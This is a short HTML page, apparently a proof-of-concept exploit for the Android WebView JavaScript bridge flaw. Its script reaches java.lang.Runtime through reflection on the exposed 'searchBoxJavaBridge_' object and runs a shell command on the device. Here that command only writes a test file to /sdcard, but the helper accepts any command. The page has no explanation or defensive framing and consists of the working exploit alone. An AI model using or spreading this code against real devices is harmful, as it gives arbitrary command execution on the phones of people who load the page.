<html><head><script>

function execute(cmdArgs)

{

    return searchBoxJavaBridge_.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec(cmdArgs);

}



try{

    execute(["/system/bin/sh","-c","echo 'Hello world' > /sdcard/goot.txt"]);

}catch(e){

    alert(e);

}

</script>
</head><body></body></html>